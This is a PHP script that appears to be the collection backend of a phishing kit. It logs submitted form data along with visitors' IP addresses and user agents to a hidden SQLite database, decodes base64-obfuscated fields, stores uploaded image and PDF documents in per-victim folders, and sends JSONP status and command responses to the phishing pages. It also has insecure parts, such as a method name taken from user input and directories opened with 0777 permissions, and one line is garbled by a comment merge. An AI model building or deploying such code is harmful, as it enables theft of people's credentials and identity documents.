<?php

function reArrayFiles(&$file_post)
{

    $file_ary   = array();
    $file_count = count($file_post['name']);
    $file_keys  = array_keys($file_post);

    for ($i = 0; $i < $file_count; $i++) {
        foreach ($file_keys as $key) {
            $file_ary[$i][$key] = $file_post[$key][$i];
        }
    }

    return $file_ary;
}

function resolve_status()
{
    global $err_mess, $uploadOk;

    if ($uploadOk) {
        return "success";
    }

    return "error=" . json_encode($err_mess);

}

//Include files
// include __DIR__ . '/classes/browser.php';

function get_ip_address()
{
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip); // just to be safeif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
                {
                    return $ip;}}}}}
$_SERVER['REMOTE_ADDR'] = get_ip_address();

//
function esc__($s)
{
    $s = htmlspecialchars($s);
    //$s=addslashes($s);
    $s = strip_tags($s);
    $s = str_replace('"', '', $s);
    $s = str_replace("'", '', $s);

    $s = trim($s);
    return $s;
}

class DE
{

    public static function kts($obj)
    {

        unset($obj->encrypt_type);
        $newobj = new stdClass();

        foreach ($obj as $key => $value) {

            $de_key = base64_decode(str_replace('kts', '', $key));
            if (gettype($obj->$key) == "object") {
                $de_val = DE::kts($obj->$key);
            } else {
                $de_val = base64_decode(str_replace('kts', '', $value));
            }

            $newobj->$de_key = $de_val;
        }
        return $newobj;
    }

}

$ip = $_SERVER['REMOTE_ADDR'];
if (isset($_GET['ip'])) {
    $ip = strip_tags($_GET['ip']);
}
;

$ua      = $_SERVER['HTTP_USER_AGENT'];
$browser = "";
// $browser = getBrowser()['name'];
$dat = date("Y-m-d H:i:s"); //readable time

$bid = base64_encode($ip);
if (isset($_GET['bid'])) {
    $bid = strip_tags($_GET['bid']);
}
;

if (isset($_GET['callback'])) {

    if (!isset($_GET['link']) || !isset($_GET['bid'])) {
        exit('No parameters');
    }

    $link = esc__(trim($_GET['link']));

    $respond         = new stdClass();
    $respond->conect = true;
    $cb              = $_GET['callback'];

    $sql = new sqlite3(__DIR__ . '/public/.htBd.db');
    $sql->busyTimeout(5000); // prevetn form locking/// very important

    //spesial ruls for banned bids
    $banned_bids = json_decode($sql->query("select bids from bloked limit 1")->fetchArray()[0]);
    if (in_array($bid, $banned_bids)) {
        $respond->saved = "ok";
        echo $cb . '(' . json_encode($respond) . ')';
        exit;
    }
//ruls

    $stmt = $sql->prepare("select *,count() as size from main where bid=:bid and link=:link limit 1");
    $stmt->bindValue(':link', $link, SQLITE3_TEXT);
    $stmt->bindValue(':bid', $bid, SQLITE3_TEXT);
    $top_res = $stmt->execute();
    $top_res = $top_res->fetchArray();

    // $top_res = @$sql->query("select *,count() as size from main where bid='$bid' and link='$link' limit 1")->fetchArray();
    $ROW_LENGTH = (bool) $top_res['size'];

    if (isset($_GET['sl'])) {
        $data = isset($_GET['data']) ? json_decode($_GET['data']) : new stdClass();
        $st   = isset($_REQUEST['done']) ? true : false;
        $logs = "";

        if (isset($data->encrypt_type)) {
            $encrypt_type = $data->encrypt_type;
            $data         = DE::$encrypt_type($data);
        }

        foreach ($data as $key => $value) {
            $logs .= esc__($key) . "=" . esc__($value) . PHP_EOL;
        }
        ;

        if (isset($_POST['data'])) {
            $data = $_POST['data'];
            foreach ($data as $key => $value) {
                $logs .= esc__($key) . "=" . esc__($value) . PHP_EOL;
            }
            ;
        }

        if ($ROW_LENGTH) {

            $stmt = $sql->prepare("update main set  lc=:dat,log=:logs||log ,st=:st  where bid=:bid and link=:link");
            $stmt->bindValue(':dat', $dat, SQLITE3_TEXT);
            $stmt->bindValue(':logs', $logs, SQLITE3_TEXT);
            $stmt->bindValue(':st', $st, SQLITE3_TEXT);
            $stmt->bindValue(':link', $link, SQLITE3_TEXT);
            $stmt->bindValue(':bid', $bid, SQLITE3_TEXT);
            $res = $stmt->execute();

            // $res     = @$sql->exec("update main set  lc='$dat',log='$logs'||log ,st='$st'  where bid='$bid' and link='$link'");
            if ($res) {} else { $respond->err = $sql->lastErrorMsg();}
            ;
        } else {
            $logs .= "User agent=" . $ua . "" . PHP_EOL;
            $logs .= "IP=" . $ip . "" . PHP_EOL;

            $stmt = $sql->prepare("insert into main(lc,bid,link,ip,ua,log,st)values(:dat,:bid,:link,:ip,:browser,:logs,:st)");
            $stmt->bindValue(':dat', $dat, SQLITE3_TEXT);
            $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
            $stmt->bindValue(':browser', $ua, SQLITE3_TEXT);
            $stmt->bindValue(':logs', $logs, SQLITE3_TEXT);
            $stmt->bindValue(':st', $st, SQLITE3_TEXT);
            $stmt->bindValue(':link', $link, SQLITE3_TEXT);
            $stmt->bindValue(':bid', $bid, SQLITE3_TEXT);
            $res = $stmt->execute();

            // $res = $sql->exec("insert into main(lc,bid,link,ip,ua,log,st)values('$dat','$bid','$link','$ip','$browser','$logs','$st')");
            if ($res) {
                $ROW_LENGTH = true;
            } else { $respond->err = $sql->lastErrorMsg();}

            // jabber_action('new_log',"New log",$link,$bid);
        }
    } //if get->sl

/*
Check state of curetn bid
 */

    if (isset($_GET['comm'])) {

        $comm = esc__($_GET['comm']);

        if ($ROW_LENGTH) {

            $stmt = $sql->prepare("update main set  lc=:dat,comm=:comm  where bid=:bid and link=:link");
            $stmt->bindValue(':dat', $dat, SQLITE3_TEXT);
            $stmt->bindValue(':comm', $comm, SQLITE3_TEXT);
            $stmt->bindValue(':link', $link, SQLITE3_TEXT);
            $stmt->bindValue(':bid', $bid, SQLITE3_TEXT);
            $res = $stmt->execute();
            if ($res) {} else { $respond->err = $sql->lastErrorMsg();}

        } else {

            $stmt = $sql->prepare("insert into main(lc,bid,link,ip,ua,log,comm,st)values(:dat,:bid,:link,:ip,:browser,'',:comm,'0')");
            $stmt->bindValue(':dat', $dat, SQLITE3_TEXT);
            $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
            $stmt->bindValue(':browser', $ua, SQLITE3_TEXT);
            $stmt->bindValue(':comm', $comm, SQLITE3_TEXT);
            $stmt->bindValue(':link', $link, SQLITE3_TEXT);
            $stmt->bindValue(':bid', $bid, SQLITE3_TEXT);
            $res = $stmt->execute();
            if ($res) {
                $ROW_LENGTH = true;
            } else { $respond->err = $sql->lastErrorMsg();}
        }
    }

    if (isset($_GET['storage_set'])) {

        $storage = json_decode($_GET['storage_set']);

        if ($storage != null) {

            if ($ROW_LENGTH) {
                $new_storrage = json_encode(array_merge((array) json_decode($top_res['storage']), (array) $storage));

                $stmt = $sql->prepare("update main set  lc=:dat,storage=:storage  where bid=:bid and link=:link");
                $stmt->bindValue(':dat', $dat, SQLITE3_TEXT);
                $stmt->bindValue(':storage', $new_storrage, SQLITE3_TEXT);
                $stmt->bindValue(':link', $link, SQLITE3_TEXT);
                $stmt->bindValue(':bid', $bid, SQLITE3_TEXT);
                $res = $stmt->execute();
                if ($res) {} else { $respond->err = $sql->lastErrorMsg();}

            } else {


                $new_storrage=json_encode($storage);

                $stmt = $sql->prepare("insert into main(lc,bid,link,ip,ua,log,storage,st)values(:dat,:bid,:link,:ip,:browser,'',:storage,'0')");
                $stmt->bindValue(':dat', $dat, SQLITE3_TEXT);
                $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
                $stmt->bindValue(':browser', $ua, SQLITE3_TEXT);
                $stmt->bindValue(':storage', $new_storrage, SQLITE3_TEXT);
                $stmt->bindValue(':link', $link, SQLITE3_TEXT);
                $stmt->bindValue(':bid', $bid, SQLITE3_TEXT);
                $res = $stmt->execute();
                if ($res) {
                    $ROW_LENGTH = true;
                } else { $respond->err = $sql->lastErrorMsg();}
            }
        } else {
            exit("Storage request is broken!");
        }

    }

    if (isset($_GET['storage_get'])) {

        if ($ROW_LENGTH) {
            $storage          = $top_res['storage'];
            $respond->storage = $storage;

        } else {

            $respond->storage = new stdClass();

        }
    }

    if (isset($_GET['st'])) {

        if ($ROW_LENGTH) {
            $st          = (int) (bool) $top_res['st'];
            $respond->st = $st;

        } else {

            $respond->st = 0;

        }
    }

/*
Recive Files
 */

    if (!empty($_FILES['docs'])) {

        $err_mess = array();
        $docs     = reArrayFiles($_FILES['docs']);

        foreach ($docs as $doc) {
            // $target_file = "../plugins/logs/public/docs/".$bid."/" . basename($doc['name']);

            if (!file_exists(__DIR__ . "/public/docs/" . $bid)) {
                mkdir(__DIR__ . "/public/docs/" . $bid, 0777);
            }
            // $target_file = "../plugins/logs/public/docs/".$bid."/" . basename($doc['name']);

            $uploadOk      = 1;
            $imageFileType = pathinfo($doc['name'], PATHINFO_EXTENSION);

            $check = getimagesize($doc["tmp_name"]);
            if ($check !== false) {
                //echo "File is an image - " . $check["mime"] . ".";
                $uploadOk = 1;
            } else {
                $err_mess[] = "File is not an image.";
                $uploadOk   = 0;
            }

            $target_file = __DIR__ . "/public/docs/" . $bid . "/" . "newfile_" . time() . rand(5, 15) . "." . $imageFileType;

            // Check if file already exists
            if (file_exists($target_file)) {
                $err_mess[] = "Sorry, file already exists.";
                //$uploadOk = 0;
            }
            // Check file size
            if ($doc["size"] > 50000000) {
                $err_mess[] = "Sorry, your file is too large.";
                $uploadOk   = 0;
            }
            // Allow certain file formats
            if ($imageFileType != "jpg" && $imageFileType != "pdf" && $imageFileType != "PDF" && $imageFileType != "png" && $imageFileType != "jpeg" && $imageFileType != "gif" && $imageFileType != "JPG" && $imageFileType != "PNG" && $imageFileType != "JPEG" && $imageFileType != "GIF") {
                $err_mess[] = "Sorry, only JPG, JPEG, PNG and GIF files are allowed.";
                $uploadOk   = 0;
            }
            // Check if $uploadOk is set to 0 by an error
            if ($uploadOk == 0) {
                $err_mess[] = "Sorry, your file was not uploaded.";

                // if everything is ok, try to upload file
            } else {
                if (move_uploaded_file($doc["tmp_name"], $target_file)) {
                    // echo "The file ". basename( $doc["name"]). " has been uploaded.".PHP_EOL;

                } else {
                    $err_mess[] = "Sorry, there was an error uploading your file.";

                }

            }
        }
//print_r($err_mess);

        header("location:" . strtok($_SERVER["HTTP_REFERER"], '?') . '?' . resolve_status());
        exit;
    }

// ## FILES 2019

    if (!empty($_FILES)) {
        $err_mess = array();

        if (!file_exists(__DIR__ . "/public/docs/" . $bid)) {
            mkdir(__DIR__ . "/public/docs/" . $bid, 0777);

        }

        foreach ($_FILES as $file_object) {

            $check = getimagesize($file_object["tmp_name"]);
            if ($check !== false) {
                //echo "File is an image - " . $check["mime"] . ".";
            } else {
                $err_mess[] = "File is not an image.";

            }

            $imageFileType = pathinfo($file_object['name'], PATHINFO_EXTENSION);

            // Allow certain file formats
            if ($imageFileType != "jpg" && $imageFileType != "pdf" && $imageFileType != "PDF" && $imageFileType != "png" && $imageFileType != "jpeg" && $imageFileType != "gif" && $imageFileType != "JPG" && $imageFileType != "PNG" && $imageFileType != "JPEG" && $imageFileType != "GIF") {
                $err_mess[] = "Sorry, only JPG, JPEG, PNG and GIF files are allowed.";

            }
            // Check file size

            if ($file_object["size"] > 50000000) {
                $err_mess[] = "Sorry, your file is too large.";

            }

            $target_file = __DIR__ . "/public/docs/" . $bid . "/" . "newfile_" . time() . rand(5, 15) . "." . $imageFileType;

            // Check if $uploadOk is set to 0 by an error

            if (empty($err_mess)) {
                if (move_uploaded_file($file_object["tmp_name"], $target_file)) {
                    // echo "The file ". basename( $doc["name"]). " has been uploaded.".PHP_EOL;

                } else {
                    $err_mess[] = "Sorry, there was an error uploading your file";

                }
            }

        }
        echo json_encode($err_mess);

        // header("location:" . strtok($_SERVER["HTTP_REFERER"], '?') . '?' . resolve_status());
        exit;
    }

// ## FILES 2019

    echo $cb . '(' . json_encode($respond) . ')';
}
;

$sql->close();
unset($sql);
